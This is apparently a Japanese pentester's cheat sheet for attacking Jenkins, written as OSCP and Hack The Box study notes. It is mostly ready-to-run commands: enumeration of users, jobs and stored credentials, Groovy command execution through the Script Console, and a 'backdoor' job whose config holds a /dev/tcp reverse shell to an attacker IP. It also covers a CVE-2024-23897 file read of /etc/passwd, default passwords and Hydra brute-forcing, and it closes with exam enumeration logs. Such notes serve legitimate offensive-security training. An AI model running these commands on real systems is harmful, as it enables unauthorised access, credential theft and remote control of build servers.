- HTBのBuilderなどで要検証

---

# Jenkins とは

- CI/CD用オープンソースの自動化サーバー
- スクリプト実行やプラグインエコシステムといった機能を備えており、特に*Script Console*は 強力なRCEポイント
- 脆弱プラグインも侵入経路に使える
- デフォルトポート
    - HTTP: 8080
    - HTTPS: 8443

---

# Jenkinsが使われているときの出力

```powershell
# winpeas
ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
   =================================================================================
Protocol Local AddressLocal PortRemote Address Remote Port State Process ID Process Name

TCP 0.0.0.0 8080 0.0.0.0  0 Listening  3944java
```

---

# 接続

- [Authenticating scripted clients  - Jenkins](https://www.jenkins.io/doc/book/system-administration/authenticating-scripted-clients/)
- パスワードベース認証とAPI token認証方式がある
>Jenkins は認証ネゴシエーションを一切行わないことに注意してください。つまり、401 (Unauthorized) 応答ではなく 403 (Forbidden) 応答を直ちに返すため、最初のリクエストから認証情報を送信するようにしてください (「**事前認証**」とも呼ばれます)。

## HTTP(s)

```zsh
curl -X POST -L --user <username>:<pw|apiToken> <url>
```
```zsh
wget --auth-no-challenge --user=<username> --password=<pw|apiToken> <url>
```

代表的なパス
```
/login
/signup
/dashboard
/manage
/script
``` 

## Jenkins CLI

- JNLP（Java Network Launch Protocol)を使う
- JNLPとは、Java Web Start を使ってリモートの Java アプリケーションを起動するための仕組みであり、エージェント接続用プロトコル

Jenkins CLI JARをダウンロード
```zsh
wget <url>/jnlpJars/jenkins-cli.jar
```

認証付きCLI接続
```zsh
java -jar jenkins-cli.jar -s <url> -auth <username>:password who-am-i
```

## Jenkins API（REST）

```zsh
# バージョン確認
curl <url>/api/json

# 認証付き
curl --user <username>:<apiToken> <url>/api/json
````

ジョブ一覧(`[name]`は変更せず指定)
```zsh
# url一覧も欲しい場合は、[name,url]とする
curl --user <username>:<apiToken> <url>/api/json?tree=jobs[name]
```

---

# Recon

バージョン検出
```zsh
curl -s <url> | grep -i jenkins

# APIから
curl -s http://target.com:8080/api/json | jq .

# ヘッダから
curl -I <url> | grep -i "x-jenkins"

# ログインページから
curl -s <url>/login | grep "Jenkins ver"
````
- → バージョンがヘッダー/HTML内に露出している場合あり
- 403が返る場合は事前認証が必要

anonymousアクセス試行
```zsh
# anonymousアクセスの有効性確認
curl -s <url>/asynchPeople/

# script consoleの確認
curl -s <url>/script

# job creationの確認
curl -s <url>/view/all/newJob

# system logの確認
curl -s <url>/log/all
```

---

# Enumeration

anonymousログインが可能であれば、`--user`は不要

ユーザー確認
```zsh
curl -s <url>/asynchPeople/ --user <username>:<pw|apiToken>

# ユーザーAPIの確認
curl <url>/user/admin/api/json --user <username>:<pw|apiToken>

# signupページの確認
curl <url>/signup --user <username>:<pw|apiToken>
```

ジョブ列挙
```zsh
curl <url>/api/json?tree=jobs[name,url] --user <username>:<pw|apiToken>

# ビルド情報
curl --user <username>:<pw|apiToken> \
  <url>/job/<job-name>/api/json?tree=builds[number,url]
````

コンソール出力
```zsh
curl <url>/job/<job-name>/lastBuild/consoleText --user <username>:<pw|apiToken>
```

プラグイン列挙
```zsh
curl <url>/pluginManager/api/json?depth=1 --user <username>:<pw|apiToken>
````
- → 脆弱なプラグインがあれば要確認

認証情報探索
```zsh
# Jenkins credentials storage
curl --user <username>:<pw|apiToken> <url>/credentials/

# ジョブ定義内の平文データ 
curl --user <username>:<pw|apiToken> <url>/job/<job-name>/config.xml

# ビルドログからパス/トークン検索
curl --user <username>:<pw|apiToken> \
  <url>/job/<job-name>/lastBuild/consoleText \
  | grep -i "password\|secret\|token"
```

ノード（ビルドノード）列挙
```zsh
curl --user <username>:<pw|apiToken> <url>/computer/api/json
````

システム情報
```zsh
curl --user <username>:<pw|apiToken> <url>/systemInfo
```

---

# Exploit

## デフォルト/弱い認証

Path
```
<url>/login
```

```
admin:admin  
jenkins:jenkins  
admin:password  
admin:jenkins  
user:user
```

## Script Console エクスプロイト

Path
```
<url>/script
```

コマンド実行
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = "whoami".execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout"
````

リバースシェル([revshell.com](https://www.revshells.com/))
	⚠️ShellはターゲットOSに合わせて、Linuxならbash、Windowsならcmdとすること
![[Pasted image 20260113123622.png]]
$$revshells.com$$

## ジョブ作成によるエクスプロイト

1. 悪意あるジョブを作成（API経由）
```zsh
curl -X POST \
  <url>/createItem?name=backdoor \
  --user <username>:<pw|apiToken> \
  --data-binary @job-config.xml \
  -H "Content-Type: application/xml"
```

2. `job-config.xml`にリバースシェル等を埋め込む
```
<hudson.tasks.Shell>
  <command>zsh -i >& /dev/tcp/<AttackerIP>/4444 0>&1</command>
</hudson.tasks.Shell>
```

3. ビルドトリガー
```zsh
curl -X POST \
  <url>/job/backdoor/build \
  --user <username>:<pw|apiToken>
```

## APIトークンの生成

APIトークン生成
```zsh
curl -X POST \  <url>/user/<username>/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken \
  --user <username>:<password> \
  -d "newTokenName=<token>"
````
- 取得したトークンを用いてAPIへアクセス

## Arbitrary File Read: CVE-2024-23897

※ 脆弱なバージョン:
- Jenkins < 2.441
- LTS < 2.426.3 ([ScanNetSecurity](https://scan.netsecurity.ne.jp/article/2024/03/27/50773.html?utm_source=chatgpt.com "Jenkins に任意のファイルの読み取りが可能となるコマンドラインインターフェース機能におけるアクセス制御不備の脆弱性（Scan Tech Report） | ScanNetSecurity"))
```zsh
java -jar jenkins-cli.jar -s <url>/ help "@/etc/passwd"
```

## ブルートフォース

Hydra例:
```zsh
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"
````

---

# OSCP第１回受験JENKINS環境

- OSCP試験第一回は、以下のようなJNKINSのAD setで落ちた

## WinPEAS実行結果抽出

```powershell

ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
   =================================================================================================

   Computer Name           :   SRV22
   User Name               :   jenkins
   User Id                 :   1000
   Is Enabled              :   True
   User Type               :   User
   Comment                 :   
   Last Logon              :   11/13/2024 2:23:46 AM
   Logons Count            :   6
   Password Last Set       :   10/9/2024 12:23:12 PM


ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\b.martin : b.martin [Allow: AllAccess]
    C:\Users\Default
    C:\Users\Default User
    C:\Users\jenkins
    C:\Users\Public

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath

ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
=================================================================================================

    Jenkins(Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Autoload
    Jenkins Automation Server

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Java
    C:\Program Files\Jenkins

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside 
  Enumerating IPv4 connections
   =================================================================================================

Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

TCP        0.0.0.0               8080          0.0.0.0               0               Listening         3944            java

ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services

# jenkinsにはアクセスできないけど。。。なぜ？→レジストリにアクセスして確認しているから
    Jenkins(Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Autoload
    Jenkins Automation Server

```

## 手動列挙結果抽出

jenkinsディレクトリはアクセス不可
```powershell
*Evil-WinRM* PS C:\Program Files> dir Java


    Directory: C:\Program Files\Java


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   1:24 PM                jdk-21

*Evil-WinRM* PS C:\Program Files> dir Jenkins
Access to the path 'C:\Program Files\Jenkins' is denied.
At line:1 char:1
+ dir Jenkins
+ ~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Program Files\Jenkins:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

Jenkinsに関するファイルは特になし
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> Get-ChildItem -Recurse C:\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "jenkins"} -ErrorAction SilentlyContinue


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   1:26 PM                Jenkins


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/9/2024   1:26 PM                jenkins

```

サービスにもアクセスできない
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> sc.exe query jenkins
[SC] EnumQueryServicesStatus:OpenService FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\Users\b.martin\Documents> 

```

ブラウザ、シェル、ローカルからのいずれからも403
```powershell
*Evil-WinRM* PS C:\Users\b.martin\Documents> wget 127.0.0.1:8080
The remote server returned an error: (403) Forbidden.
At line:1 char:1
+ wget 127.0.0.1:8080
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```
